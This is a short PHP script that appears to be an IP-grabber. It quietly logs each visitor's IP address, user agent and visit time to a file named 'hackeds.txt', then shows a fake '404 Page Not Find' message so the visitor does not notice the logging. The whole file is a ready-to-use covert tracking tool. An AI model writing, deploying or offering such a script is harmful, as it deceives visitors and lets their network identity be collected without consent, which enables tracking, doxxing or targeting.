<?php



$save_name_file = "hackeds.txt";
$html_web = "<h1>Opsss. Error 404 Page Not Find :( </h1>";




$browser = $_SERVER['HTTP_USER_AGENT'];
$operating_system = $_SERVER['HTTP_USER_AGENT'];
$ip_address = $_SERVER['REMOTE_ADDR'];
$current_date = date("Y-m-d H:i:s");
$data = "\n Date: $current_date\n";
$data .= "IP Address: $ip_address\n";
$data .= "Browser: $browser\n";
$data .= "Operating System: $operating_system\n\n";
file_put_contents($save_name_file, $data, FILE_APPEND);
echo $html_web;
?>
